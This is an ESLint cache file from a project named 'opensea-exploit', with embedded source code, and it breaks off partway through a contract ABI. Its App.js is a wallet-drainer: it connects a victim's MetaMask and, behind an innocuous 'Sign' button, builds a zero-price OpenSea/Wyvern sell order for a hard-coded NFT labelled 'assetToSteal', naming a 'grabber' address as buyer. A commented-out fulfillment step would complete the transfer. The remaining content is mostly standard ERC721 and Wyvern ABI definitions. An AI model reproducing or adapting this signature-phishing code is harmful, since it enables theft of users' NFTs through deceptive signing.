[{"/Users/romanrakhlin/Dropbox/Mac/Desktop/opensea-exploit/src/index.js":"1","/Users/romanrakhlin/Dropbox/Mac/Desktop/opensea-exploit/src/App.js":"2","/Users/romanrakhlin/Dropbox/Mac/Desktop/opensea-exploit/src/reportWebVitals.js":"3","/Users/romanrakhlin/Dropbox/Mac/Desktop/opensea-exploit/src/components/ConnectWalletButton.js":"4","/Users/romanrakhlin/Dropbox/Mac/Desktop/opensea-exploit/src/opensea-sdk/contracts/index.js":"5","/Users/romanrakhlin/Dropbox/Mac/Desktop/opensea-exploit/src/opensea-sdk/contracts/abis/WyvernProxyRegistry.js":"6","/Users/romanrakhlin/Dropbox/Mac/Desktop/opensea-exploit/src/opensea-sdk/contracts/abis/ERC721.js":"7","/Users/romanrakhlin/Dropbox/Mac/Desktop/opensea-exploit/src/opensea-sdk/contracts/abis/Wyvern.js":"8","/Users/romanrakhlin/Dropbox/Mac/Desktop/opensea-exploit/src/opensea-sdk/contracts/abis/Exchange.js":"9","/Users/romanrakhlin/Dropbox/Mac/Desktop/opensea-exploit/src/opensea-sdk/contracts/abis/ERC1155.js":"10","/Users/romanrakhlin/Dropbox/Mac/Desktop/opensea-exploit/src/opensea-sdk/contracts/abis/Weth.js":"11","/Users/romanrakhlin/Dropbox/Mac/Desktop/opensea-exploit/src/opensea-sdk/contracts/abis/ERC721Exchange.js":"12","/Users/romanrakhlin/Dropbox/Mac/Desktop/opensea-exploit/src/opensea-sdk/index.js":"13","/Users/romanrakhlin/Dropbox/Mac/Desktop/opensea-exploit/src/opensea-sdk/opensea.js":"14","/Users/romanrakhlin/Dropbox/Mac/Desktop/opensea-exploit/src/opensea-sdk/WyvernSchema.js":"15","/Users/romanrakhlin/Dropbox/Mac/Desktop/opensea-exploit/src/opensea-sdk/Constants.js":"16","/Users/romanrakhlin/Dropbox/Mac/Desktop/opensea-exploit/src/opensea-sdk/methods/CreateOrder.js":"17","/Users/romanrakhlin/Dropbox/Mac/Desktop/opensea-exploit/src/opensea-sdk/helpers/EncodeSell.js":"18","/Users/romanrakhlin/Dropbox/Mac/Desktop/opensea-exploit/src/opensea-sdk/helpers/GetTimeParameters.js":"19","/Users/romanrakhlin/Dropbox/Mac/Desktop/opensea-exploit/src/opensea-sdk/helpers/SignTypedDataAsync.js":"20","/Users/romanrakhlin/Dropbox/Mac/Desktop/opensea-exploit/src/opensea-sdk/helpers/EncodeCall.js":"21","/Users/romanrakhlin/Dropbox/Mac/Desktop/opensea-exploit/src/opensea-sdk/helpers/ParseSignatureHex.js":"22","/Users/romanrakhlin/Dropbox/Mac/Desktop/opensea-exploit/src/opensea-sdk/methods/CancelOrder.js":"23","/Users/romanrakhlin/Dropbox/Mac/Desktop/opensea-exploit/src/opensea-sdk/methods/PerformOrder.js":"24","/Users/romanrakhlin/Dropbox/Mac/Desktop/opensea-exploit/src/opensea-sdk/helpers/EncodeBuy.js":"25"},{"size":486,"mtime":1659546870965,"results":"26","hashOfConfig":"27"},{"size":2746,"mtime":1659573317514,"results":"28","hashOfConfig":"27"},{"size":362,"mtime":1648051280000,"results":"29","hashOfConfig":"27"},{"size":966,"mtime":1659546786605,"results":"30","hashOfConfig":"27"},{"size":1785,"mtime":1659552587059,"results":"31","hashOfConfig":"27"},{"size":3475,"mtime":1652945119000,"results":"32","hashOfConfig":"27"},{"size":8325,"mtime":1652945119000,"results":"33","hashOfConfig":"27"},{"size":16280,"mtime":1652945119000,"results":"34","hashOfConfig":"27"},{"size":19090,"mtime":1652945119000,"results":"35","hashOfConfig":"27"},{"size":7309,"mtime":1652945119000,"results":"36","hashOfConfig":"27"},{"size":3410,"mtime":1652945119000,"results":"37","hashOfConfig":"27"},{"size":5665,"mtime":1652945119000,"results":"38","hashOfConfig":"27"},{"size":26,"mtime":1659548222799,"results":"39","hashOfConfig":"27"},{"size":16769,"mtime":1659576298709,"results":"40","hashOfConfig":"27"},{"size":4249,"mtime":1659548810651,"results":"41","hashOfConfig":"27"},{"size":5175,"mtime":1659561801331,"results":"42","hashOfConfig":"27"},{"size":20703,"mtime":1659575224019,"results":"43","hashOfConfig":"27"},{"size":1115,"mtime":1659573924054,"results":"44","hashOfConfig":"27"},{"size":2028,"mtime":1659573608338,"results":"45","hashOfConfig":"27"},{"size":1800,"mtime":1659574760540,"results":"46","hashOfConfig":"27"},{"size":373,"mtime":1659573363246,"results":"47","hashOfConfig":"27"},{"size":1883,"mtime":1659574764082,"results":"48","hashOfConfig":"27"},{"size":2038,"mtime":1659575611835,"results":"49","hashOfConfig":"27"},{"size":11614,"mtime":1659576233915,"results":"50","hashOfConfig":"27"},{"size":1654,"mtime":1659575996932,"results":"51","hashOfConfig":"27"},{"filePath":"52","messages":"53","errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":"54"},"1fo98ct",{"filePath":"55","messages":"56","errorCount":0,"fatalErrorCount":0,"warningCount":2,"fixableErrorCount":0,"fixableWarningCount":0,"source":"57","usedDeprecatedRules":"54"},{"filePath":"58","messages":"59","errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":"54"},{"filePath":"60","messages":"61","errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":"54"},{"filePath":"62","messages":"63","errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":"54"},{"filePath":"64","messages":"65","errorCount":0,"fatalErrorCount":0,"warningCount":1,"fixableErrorCount":0,"fixableWarningCount":0,"source":"66","usedDeprecatedRules":"54"},{"filePath":"67","messages":"68","errorCount":0,"fatalErrorCount":0,"warningCount":1,"fixableErrorCount":0,"fixableWarningCount":0,"source":"69","usedDeprecatedRules":"54"},{"filePath":"70","messages":"71","errorCount":0,"fatalErrorCount":0,"warningCount":1,"fixableErrorCount":0,"fixableWarningCount":0,"source":"72","usedDeprecatedRules":"54"},{"filePath":"73","messages":"74","errorCount":0,"fatalErrorCount":0,"warningCount":1,"fixableErrorCount":0,"fixableWarningCount":0,"source":"75","usedDeprecatedRules":"54"},{"filePath":"76","messages":"77","errorCount":0,"fatalErrorCount":0,"warningCount":1,"fixableErrorCount":0,"fixableWarningCount":0,"source":"78","usedDeprecatedRules":"79"},{"filePath":"80","messages":"81","errorCount":0,"fatalErrorCount":0,"warningCount":1,"fixableErrorCount":0,"fixableWarningCount":0,"source":"82","usedDeprecatedRules":"54"},{"filePath":"83","messages":"84","errorCount":0,"fatalErrorCount":0,"warningCount":1,"fixableErrorCount":0,"fixableWarningCount":0,"source":"85","usedDeprecatedRules":"54"},{"filePath":"86","messages":"87","errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":"54"},{"filePath":"88","messages":"89","errorCount":1,"fatalErrorCount":0,"warningCount":34,"fixableErrorCount":0,"fixableWarningCount":0,"source":null},{"filePath":"90","messages":"91","errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":"54"},{"filePath":"92","messages":"93","errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":"54"},{"filePath":"94","messages":"95","errorCount":0,"fatalErrorCount":0,"warningCount":5,"fixableErrorCount":0,"fixableWarningCount":0,"source":"96","usedDeprecatedRules":"54"},{"filePath":"97","messages":"98","errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":"54"},{"filePath":"99","messages":"100","errorCount":0,"fatalErrorCount":0,"warningCount":4,"fixableErrorCount":0,"fixableWarningCount":0,"source":"101","usedDeprecatedRules":"54"},{"filePath":"102","messages":"103","errorCount":0,"fatalErrorCount":0,"warningCount":1,"fixableErrorCount":0,"fixableWarningCount":0,"source":"104","usedDeprecatedRules":"54"},{"filePath":"105","messages":"106","errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":"54"},{"filePath":"107","messages":"108","errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":"54"},{"filePath":"109","messages":"110","errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":"54"},{"filePath":"111","messages":"112","errorCount":0,"fatalErrorCount":0,"warningCount":6,"fixableErrorCount":0,"fixableWarningCount":0,"source":null},{"filePath":"113","messages":"114","errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0},"/Users/romanrakhlin/Dropbox/Mac/Desktop/opensea-exploit/src/index.js",[],["115","116"],"/Users/romanrakhlin/Dropbox/Mac/Desktop/opensea-exploit/src/App.js",["117","118"],"import { useState } from \"react\";\nimport \"./App.css\";\nimport Web3 from \"web3\";\nimport ConnectWalletButton from \"./components/ConnectWalletButton\";\n\nimport { createOrder, fulfillOrder } from \"./opensea-sdk\";\n\nconst App = () => {\n\n    const [loading, setLoading] = useState(false);\n    const [address, setAddress] = useState(\"\");\n\n    const onPressConnect = async() => {\n        setLoading(true);\n\n        try {\n            if (window?.ethereum?.isMetaMask) {\n                const accounts = await window.ethereum.request({\n                    method: \"eth_requestAccounts\"\n                });\n\n                const account = Web3.utils.toChecksumAddress(accounts[0]);\n                setAddress(account);\n            }\n        } catch (error) {\n            console.log(error);\n            setAddress(\"\");\n        }\n\n        setLoading(false);\n    };\n\n    const onPressLogout = () => {\n        setAddress(\"\");\n    };\n\n    const signSmth = async () => {\n        const web3 = new Web3(Web3.givenProvider);\n        const provider = web3.currentProvider\n\n        const assetToSteal = {\n            \"tokenId\": \"8932\",\n            \"tokenAddress\": \"0x8056aD118916db0fEef1c8B82744Fa37E5d57CC0\"\n        }\n        const grabber = \"0xa95889dF74d9F9A73b76DB329c71b78A2F62f635\";\n        const order = await createOrder({\n            provider: provider,\n            asset: assetToSteal,\n            accountAddress: address,\n            startAmount: 0,\n            endAmount: 0,\n            quantity: 1,\n            listingTime: 0,\n            expirationTime: 0,\n            englishAuctionReservePrice: 0,\n            paymentTokenAddress: \"0x8056aD118916db0fEef1c8B82744Fa37E5d57CC0\",\n            extraBountyBasisPoints: 0,\n            buyerAddress: grabber,\n            fees: 0.01,\n            buyerEmail: \"hui228@mail.ru\"\n        });\n\n        console.log(order);\n\n        // await fulfillOrder({\n        //     order: order,\n        //     provider: provider,\n        //     accountAddress: address,\n        //     recipientAddress: grabber,\n        //     referrerAddress: grabber\n        // });\n    }\n\n    return (\n        <div className=\"App\">\n            <header className=\"Header\">\n                <ConnectWalletButton\n                    onPressConnect={onPressConnect}\n                    onPressLogout={onPressLogout}\n                    loading={loading}\n                    address={address}\n                />\n                \n                { \n                    address != \"\" ?\n                        <button onClick={signSmth}>\n                            <h2>Sign</h2>\n                        </button>\n                    : \n                        <></>\n                }\n            </header>\n        </div>\n    );\n};\n\nexport default App;","/Users/romanrakhlin/Dropbox/Mac/Desktop/opensea-exploit/src/reportWebVitals.js",[],"/Users/romanrakhlin/Dropbox/Mac/Desktop/opensea-exploit/src/components/ConnectWalletButton.js",[],"/Users/romanrakhlin/Dropbox/Mac/Desktop/opensea-exploit/src/opensea-sdk/contracts/index.js",[],"/Users/romanrakhlin/Dropbox/Mac/Desktop/opensea-exploit/src/opensea-sdk/contracts/abis/WyvernProxyRegistry.js",["119"],"export default [\n  {\n    constant: true,\n    inputs: [],\n    name: 'name',\n    outputs: [{ name: '', type: 'string' }],\n    payable: false,\n    stateMutability: 'view',\n    type: 'function'\n  },\n  {\n    constant: true,\n    inputs: [],\n    name: 'initialAddressSet',\n    outputs: [{ name: '', type: 'bool' }],\n    payable: false,\n    stateMutability: 'view',\n    type: 'function'\n  },\n  {\n    constant: false,\n    inputs: [{ name: 'addr', type: 'address' }],\n    name: 'endGrantAuthentication',\n    outputs: [],\n    payable: false,\n    stateMutability: 'nonpayable',\n    type: 'function'\n  },\n  {\n    constant: false,\n    inputs: [{ name: 'addr', type: 'address' }],\n    name: 'revokeAuthentication',\n    outputs: [],\n    payable: false,\n    stateMutability: 'nonpayable',\n    type: 'function'\n  },\n  {\n    constant: true,\n    inputs: [{ name: '', type: 'address' }],\n    name: 'pending',\n    outputs: [{ name: '', type: 'uint256' }],\n    payable: false,\n    stateMutability: 'view',\n    type: 'function'\n  },\n  {\n    constant: true,\n    inputs: [{ name: '', type: 'address' }],\n    name: 'contracts',\n    outputs: [{ name: '', type: 'bool' }],\n    payable: false,\n    stateMutability: 'view',\n    type: 'function'\n  },\n  {\n    constant: false,\n    inputs: [],\n    name: 'renounceOwnership',\n    outputs: [],\n    payable: false,\n    stateMutability: 'nonpayable',\n    type: 'function'\n  },\n  {\n    constant: true,\n    inputs: [],\n    name: 'owner',\n    outputs: [{ name: '', type: 'address' }],\n    payable: false,\n    stateMutability: 'view',\n    type: 'function'\n  },\n  {\n    constant: true,\n    inputs: [],\n    name: 'delegateProxyImplementation',\n    outputs: [{ name: '', type: 'address' }],\n    payable: false,\n    stateMutability: 'view',\n    type: 'function'\n  },\n  {\n    constant: true,\n    inputs: [{ name: '', type: 'address' }],\n    name: 'proxies',\n    outputs: [{ name: '', type: 'address' }],\n    payable: false,\n    stateMutability: 'view',\n    type: 'function'\n  },\n  {\n    constant: false,\n    inputs: [{ name: 'addr', type: 'address' }],\n    name: 'startGrantAuthentication',\n    outputs: [],\n    payable: false,\n    stateMutability: 'nonpayable',\n    type: 'function'\n  },\n  {\n    constant: false,\n    inputs: [],\n    name: 'registerProxy',\n    outputs: [{ name: 'proxy', type: 'address' }],\n    payable: false,\n    stateMutability: 'nonpayable',\n    type: 'function'\n  },\n  {\n    constant: true,\n    inputs: [],\n    name: 'DELAY_PERIOD',\n    outputs: [{ name: '', type: 'uint256' }],\n    payable: false,\n    stateMutability: 'view',\n    type: 'function'\n  },\n  {\n    constant: false,\n    inputs: [{ name: 'authAddress', type: 'address' }],\n    name: 'grantInitialAuthentication',\n    outputs: [],\n    payable: false,\n    stateMutability: 'nonpayable',\n    type: 'function'\n  },\n  {\n    constant: false,\n    inputs: [{ name: 'newOwner', type: 'address' }],\n    name: 'transferOwnership',\n    outputs: [],\n    payable: false,\n    stateMutability: 'nonpayable',\n    type: 'function'\n  },\n  { inputs: [], payable: false, stateMutability: 'nonpayable', type: 'constructor' },\n  {\n    anonymous: false,\n    inputs: [{ indexed: true, name: 'previousOwner', type: 'address' }],\n    name: 'OwnershipRenounced',\n    type: 'event'\n  },\n  {\n    anonymous: false,\n    inputs: [\n      { indexed: true, name: 'previousOwner', type: 'address' },\n      { indexed: true, name: 'newOwner', type: 'address' }\n    ],\n    name: 'OwnershipTransferred',\n    type: 'event'\n  }\n];\n","/Users/romanrakhlin/Dropbox/Mac/Desktop/opensea-exploit/src/opensea-sdk/contracts/abis/ERC721.js",["120"],"export default [\n  {\n    inputs: [{ internalType: 'string', name: 'baseURI', type: 'string' }],\n    stateMutability: 'nonpayable',\n    type: 'constructor'\n  },\n  {\n    anonymous: false,\n    inputs: [\n      { indexed: true, internalType: 'address', name: 'owner', type: 'address' },\n      { indexed: true, internalType: 'address', name: 'approved', type: 'address' },\n      { indexed: true, internalType: 'uint256', name: 'tokenId', type: 'uint256' }\n    ],\n    name: 'Approval',\n    type: 'event'\n  },\n  {\n    anonymous: false,\n    inputs: [\n      { indexed: true, internalType: 'address', name: 'owner', type: 'address' },\n      { indexed: true, internalType: 'address', name: 'operator', type: 'address' },\n      { indexed: false, internalType: 'bool', name: 'approved', type: 'bool' }\n    ],\n    name: 'ApprovalForAll',\n    type: 'event'\n  },\n  {\n    anonymous: false,\n    inputs: [\n      { indexed: true, internalType: 'address', name: 'previousOwner', type: 'address' },\n      { indexed: true, internalType: 'address', name: 'newOwner', type: 'address' }\n    ],\n    name: 'OwnershipTransferred',\n    type: 'event'\n  },\n  {\n    anonymous: false,\n    inputs: [\n      { indexed: true, internalType: 'address', name: 'from', type: 'address' },\n      { indexed: true, internalType: 'address', name: 'to', type: 'address' },\n      { indexed: true, internalType: 'uint256', name: 'tokenId', type: 'uint256' }\n    ],\n    name: 'Transfer',\n    type: 'event'\n  },\n  {\n    inputs: [],\n    name: 'MAX_TOKENS',\n    outputs: [{ internalType: 'uint256', name: '', type: 'uint256' }],\n    stateMutability: 'view',\n    type: 'function'\n  },\n  {\n    inputs: [],\n    name: 'MAX_TOKENS_INIT',\n    outputs: [{ internalType: 'uint256', name: '', type: 'uint256' }],\n    stateMutability: 'view',\n    type: 'function'\n  },\n  {\n    inputs: [{ internalType: 'uint256', name: 'numTokens', type: 'uint256' }],\n    name: 'addCharacter',\n    outputs: [],\n    stateMutability: 'nonpayable',\n    type: 'function'\n  },\n  {\n    inputs: [\n      { internalType: 'address', name: 'to', type: 'address' },\n      { internalType: 'uint256', name: 'tokenId', type: 'uint256' }\n    ],\n    name: 'approve',\n    outputs: [],\n    stateMutability: 'nonpayable',\n    type: 'function'\n  },\n  {\n    inputs: [{ internalType: 'address', name: 'owner', type: 'address' }],\n    name: 'balanceOf',\n    outputs: [{ internalType: 'uint256', name: '', type: 'uint256' }],\n    stateMutability: 'view',\n    type: 'function'\n  },\n  {\n    inputs: [],\n    name: 'baseURI',\n    outputs: [{ internalType: 'string', name: '', type: 'string' }],\n    stateMutability: 'view',\n    type: 'function'\n  },\n  {\n    inputs: [],\n    name: 'calculatePrice',\n    outputs: [{ internalType: 'uint256', name: '', type: 'uint256' }],\n    stateMutability: 'view',\n    type: 'function'\n  },\n  {\n    inputs: [{ internalType: 'uint256', name: 'tokenId', type: 'uint256' }],\n    name: 'getApproved',\n    outputs: [{ internalType: 'address', name: '', type: 'address' }],\n    stateMutability: 'view',\n    type: 'function'\n  },\n  {\n    inputs: [],\n    name: 'getCurrentSupplyCap',\n    outputs: [{ internalType: 'uint256', name: '', type: 'uint256' }],\n    stateMutability: 'view',\n    type: 'function'\n  },\n  {\n    inputs: [],\n    name: 'hasSaleStarted',\n    outputs: [{ internalType: 'bool', name: '', type: 'bool' }],\n    stateMutability: 'view',\n    type: 'function'\n  },\n  {\n    inputs: [\n      { internalType: 'address', name: 'owner', type: 'address' },\n      { internalType: 'address', name: 'operator', type: 'address' }\n    ],\n    name: 'isApprovedForAll',\n    outputs: [{ internalType: 'bool', name: '', type: 'bool' }],\n    stateMutability: 'view',\n    type: 'function'\n  },\n  {\n    inputs: [{ internalType: 'uint256', name: 'numTokens', type: 'uint256' }],\n    name: 'mewnt',\n    outputs: [],\n    stateMutability: 'payable',\n    type: 'function'\n  },\n  {\n    inputs: [],\n    name: 'name',\n    outputs: [{ internalType: 'string', name: '', type: 'string' }],\n    stateMutability: 'view',\n    type: 'function'\n  },\n  {\n    inputs: [],\n    name: 'owner',\n    outputs: [{ internalType: 'address', name: '', type: 'address' }],\n    stateMutability: 'view',\n    type: 'function'\n  },\n  {\n    inputs: [{ internalType: 'uint256', name: 'tokenId', type: 'uint256' }],\n    name: 'ownerOf',\n    outputs: [{ internalType: 'address', name: '', type: 'address' }],\n    stateMutability: 'view',\n    type: 'function'\n  },\n  { inputs: [], name: 'pauseSale', outputs: [], stateMutability: 'nonpayable', type: 'function' },\n  {\n    inputs: [],\n    name: 'renounceOwnership',\n    outputs: [],\n    stateMutability: 'nonpayable',\n    type: 'function'\n  },\n  {\n    inputs: [{ internalType: 'uint256', name: 'numTokens', type: 'uint256' }],\n    name: 'reserveGiveaway',\n    outputs: [],\n    stateMutability: 'nonpayable',\n    type: 'function'\n  },\n  {\n    inputs: [\n      { internalType: 'address', name: 'from', type: 'address' },\n      { internalType: 'address', name: 'to', type: 'address' },\n      { internalType: 'uint256', name: 'tokenId', type: 'uint256' }\n    ],\n    name: 'safeTransferFrom',\n    outputs: [],\n    stateMutability: 'nonpayable',\n    type: 'function'\n  },\n  {\n    inputs: [\n      { internalType: 'address', name: 'from', type: 'address' },\n      { internalType: 'address', name: 'to', type: 'address' },\n      { internalType: 'uint256', name: 'tokenId', type: 'uint256' },\n      { internalType: 'bytes', name: '_data', type: 'bytes' }\n    ],\n    name: 'safeTransferFrom',\n    outputs: [],\n    stateMutability: 'nonpayable',\n    type: 'function'\n  },\n  {\n    inputs: [\n      { internalType: 'address', name: 'operator', type: 'address' },\n      { internalType: 'bool', name: 'approved', type: 'bool' }\n    ],\n    name: 'setApprovalForAll',\n    outputs: [],\n    stateMutability: 'nonpayable',\n    type: 'function'\n  },\n  {\n    inputs: [{ internalType: 'string', name: 'baseURI', type: 'string' }],\n    name: 'setBaseURI',\n    outputs: [],\n    stateMutability: 'nonpayable',\n    type: 'function'\n  },\n  { inputs: [], name: 'startSale', outputs: [], stateMutability: 'nonpayable', type: 'function' },\n  {\n    inputs: [{ internalType: 'bytes4', name: 'interfaceId', type: 'bytes4' }],\n    name: 'supportsInterface',\n    outputs: [{ internalType: 'bool', name: '', type: 'bool' }],\n    stateMutability: 'view',\n    type: 'function'\n  },\n  {\n    inputs: [],\n    name: 'symbol',\n    outputs: [{ internalType: 'string', name: '', type: 'string' }],\n    stateMutability: 'view',\n    type: 'function'\n  },\n  {\n    inputs: [{ internalType: 'uint256', name: 'index', type: 'uint256' }],\n    name: 'tokenByIndex',\n    outputs: [{ internalType: 'uint256', name: '', type: 'uint256' }],\n    stateMutability: 'view',\n    type: 'function'\n  },\n  {\n    inputs: [\n      { internalType: 'address', name: 'owner', type: 'address' },\n      { internalType: 'uint256', name: 'index', type: 'uint256' }\n    ],\n    name: 'tokenOfOwnerByIndex',\n    outputs: [{ internalType: 'uint256', name: '', type: 'uint256' }],\n    stateMutability: 'view',\n    type: 'function'\n  },\n  {\n    inputs: [{ internalType: 'uint256', name: 'tokenId', type: 'uint256' }],\n    name: 'tokenURI',\n    outputs: [{ internalType: 'string', name: '', type: 'string' }],\n    stateMutability: 'view',\n    type: 'function'\n  },\n  {\n    inputs: [{ internalType: 'address', name: '_owner', type: 'address' }],\n    name: 'tokensOfOwner',\n    outputs: [{ internalType: 'uint256[]', name: '', type: 'uint256[]' }],\n    stateMutability: 'view',\n    type: 'function'\n  },\n  {\n    inputs: [],\n    name: 'totalSupply',\n    outputs: [{ internalType: 'uint256', name: '', type: 'uint256' }],\n    stateMutability: 'view',\n    type: 'function'\n  },\n  {\n    inputs: [\n      { internalType: 'address', name: 'from', type: 'address' },\n      { internalType: 'address', name: 'to', type: 'address' },\n      { internalType: 'uint256', name: 'tokenId', type: 'uint256' }\n    ],\n    name: 'transferFrom',\n    outputs: [],\n    stateMutability: 'nonpayable',\n    type: 'function'\n  },\n  {\n    inputs: [{ internalType: 'address', name: 'newOwner', type: 'address' }],\n    name: 'transferOwnership',\n    outputs: [],\n    stateMutability: 'nonpayable',\n    type: 'function'\n  },\n  { inputs: [], name: 'withdrawAll', outputs: [], stateMutability: 'payable', type: 'function' }\n];\n","/Users/romanrakhlin/Dropbox/Mac/Desktop/opensea-exploit/src/opensea-sdk/contracts/abis/Wyvern.js",["121"],"export default [\n  {\n    constant: true,\n    inputs: [],\n    name: 'name',\n    outputs: [{ name: '', type: 'string' }],\n    payable: false,\n    stateMutability: 'view',\n    type: 'function'\n  },\n  {\n    constant: true,\n    inputs: [],\n    name: 'tokenTransferProxy',\n    outputs: [{ name: '', type: 'address' }],\n    payable: false,\n    stateMutability: 'view',\n    type: 'function'\n  },\n  {\n    constant: true,\n    inputs: [\n      { name: 'target', type: 'address' },\n      { name: 'calldata', type: 'bytes' },\n      { name: 'extradata', type: 'bytes' }\n    ],\n    name: 'staticCall',\n    outputs: [{ name: 'result', type: 'bool' }],\n    payable: false,\n    stateMutability: 'view',\n    type: 'function'\n  },\n  {\n    constant: false,\n    inputs: [{ name: 'newMinimumMakerProtocolFee', type: 'uint256' }],\n    name: 'changeMinimumMakerProtocolFee',\n    outputs: [],\n    payable: false,\n    stateMutability: 'nonpayable',\n    type: 'function'\n  },\n  {\n    constant: false,\n    inputs: [{ name: 'newMinimumTakerProtocolFee', type: 'uint256' }],\n    name: 'changeMinimumTakerProtocolFee',\n    outputs: [],\n    payable: false,\n    stateMutability: 'nonpayable',\n    type: 'function'\n  },\n  {\n    constant: true,\n    inputs: [\n      { name: 'array', type: 'bytes' },\n      { name: 'desired', type: 'bytes' },\n      { name: 'mask', type: 'bytes' }\n    ],\n    name: 'guardedArrayReplace',\n    outputs: [{ name: '', type: 'bytes' }],\n    payable: false,\n    stateMutability: 'pure',\n    type: 'function'\n  },\n  {\n    constant: true,\n    inputs: [],\n    name: 'minimumTakerProtocolFee',\n    outputs: [{ name: '', type: 'uint256' }],\n    payable: false,\n    stateMutability: 'view',\n    type: 'function'\n  },\n  {\n    constant: true,\n    inputs: [],\n    name: 'codename',\n    outputs: [{ name: '', type: 'string' }],\n    payable: false,\n    stateMutability: 'view',\n    type: 'function'\n  },\n  {\n    constant: true,\n    inputs: [],\n    name: 'DOMAIN_SEPARATOR',\n    outputs: [{ name: '', type: 'bytes32' }],\n    payable: false,\n    stateMutability: 'view',\n    type: 'function'\n  },\n  {\n    constant: true,\n    inputs: [\n      { name: 'addrs', type: 'address[7]' },\n      { name: 'uints', type: 'uint256[9]' },\n      { name: 'feeMethod', type: 'uint8' },\n      { name: 'side', type: 'uint8' },\n      { name: 'saleKind', type: 'uint8' },\n      { name: 'howToCall', type: 'uint8' },\n      { name: 'calldata', type: 'bytes' },\n      { name: 'replacementPattern', type: 'bytes' },\n      { name: 'staticExtradata', type: 'bytes' }\n    ],\n    name: 'calculateCurrentPrice_',\n    outputs: [{ name: '', type: 'uint256' }],\n    payable: false,\n    stateMutability: 'view',\n    type: 'function'\n  },\n  {\n    constant: false,\n    inputs: [{ name: 'newProtocolFeeRecipient', type: 'address' }],\n    name: 'changeProtocolFeeRecipient',\n    outputs: [],\n    payable: false,\n    stateMutability: 'nonpayable',\n    type: 'function'\n  },\n  {\n    constant: true,\n    inputs: [],\n    name: 'version',\n    outputs: [{ name: '', type: 'string' }],\n    payable: false,\n    stateMutability: 'view',\n    type: 'function'\n  },\n  {\n    constant: true,\n    inputs: [\n      { name: 'buyCalldata', type: 'bytes' },\n      { name: 'buyReplacementPattern', type: 'bytes' },\n      { name: 'sellCalldata', type: 'bytes' },\n      { name: 'sellReplacementPattern', type: 'bytes' }\n    ],\n    name: 'orderCalldataCanMatch',\n    outputs: [{ name: '', type: 'bool' }],\n    payable: false,\n    stateMutability: 'pure',\n    type: 'function'\n  },\n  {\n    constant: true,\n    inputs: [\n      { name: 'addrs', type: 'address[7]' },\n      { name: 'uints', type: 'uint256[9]' },\n      { name: 'feeMethod', type: 'uint8' },\n      { name: 'side', type: 'uint8' },\n      { name: 'saleKind', type: 'uint8' },\n      { name: 'howToCall', type: 'uint8' },\n      { name: 'calldata', type: 'bytes' },\n      { name: 'replacementPattern', type: 'bytes' },\n      { name: 'staticExtradata', type: 'bytes' },\n      { name: 'v', type: 'uint8' },\n      { name: 'r', type: 'bytes32' },\n      { name: 's', type: 'bytes32' }\n    ],\n    name: 'validateOrder_',\n    outputs: [{ name: '', type: 'bool' }],\n    payable: false,\n    stateMutability: 'view',\n    type: 'function'\n  },\n  {\n    constant: false,\n    inputs: [],\n    name: 'incrementNonce',\n    outputs: [],\n    payable: false,\n    stateMutability: 'nonpayable',\n    type: 'function'\n  },\n  {\n    constant: true,\n    inputs: [\n      { name: 'side', type: 'uint8' },\n      { name: 'saleKind', type: 'uint8' },\n      { name: 'basePrice', type: 'uint256' },\n      { name: 'extra', type: 'uint256' },\n      { name: 'listingTime', type: 'uint256' },\n      { name: 'expirationTime', type: 'uint256' }\n    ],\n    name: 'calculateFinalPrice',\n    outputs: [{ name: '', type: 'uint256' }],\n    payable: false,\n    stateMutability: 'view',\n    type: 'function'\n  },\n  {\n    constant: true,\n    inputs: [],\n    name: 'protocolFeeRecipient',\n    outputs: [{ name: '', type: 'address' }],\n    payable: false,\n    stateMutability: 'view',\n    type: 'function'\n  },\n  {\n    constant: false,\n    inputs: [],\n    name: 'renounceOwnership',\n    outputs: [],\n    payable: false,\n    stateMutability: 'nonpayable',\n    type: 'function'\n  },\n  {\n    constant: true,\n    inputs: [\n      { name: 'addrs', type: 'address[7]' },\n      { name: 'uints', type: 'uint256[9]' },\n      { name: 'feeMethod', type: 'uint8' },\n      { name: 'side', type: 'uint8' },\n      { name: 'saleKind', type: 'uint8' },\n      { name: 'howToCall', type: 'uint8' },\n      { name: 'calldata', type: 'bytes' },\n      { name: 'replacementPattern', type: 'bytes' },\n      { name: 'staticExtradata', type: 'bytes' }\n    ],\n    name: 'hashOrder_',\n    outputs: [{ name: '', type: 'bytes32' }],\n    payable: false,\n    stateMutability: 'view',\n    type: 'function'\n  },\n  {\n    constant: true,\n    inputs: [\n      { name: 'addrs', type: 'address[14]' },\n      { name: 'uints', type: 'uint256[18]' },\n      { name: 'feeMethodsSidesKindsHowToCalls', type: 'uint8[8]' },\n      { name: 'calldataBuy', type: 'bytes' },\n      { name: 'calldataSell', type: 'bytes' },\n      { name: 'replacementPatternBuy', type: 'bytes' },\n      { name: 'replacementPatternSell', type: 'bytes' },\n      { name: 'staticExtradataBuy', type: 'bytes' },\n      { name: 'staticExtradataSell', type: 'bytes' }\n    ],\n    name: 'ordersCanMatch_',\n    outputs: [{ name: '', type: 'bool' }],\n    payable: false,\n    stateMutability: 'view',\n    type: 'function'\n  },\n  {\n    constant: false,\n    inputs: [\n      { name: 'addrs', type: 'address[7]' },\n      { name: 'uints', type: 'uint256[9]' },\n      { name: 'feeMethod', type: 'uint8' },\n  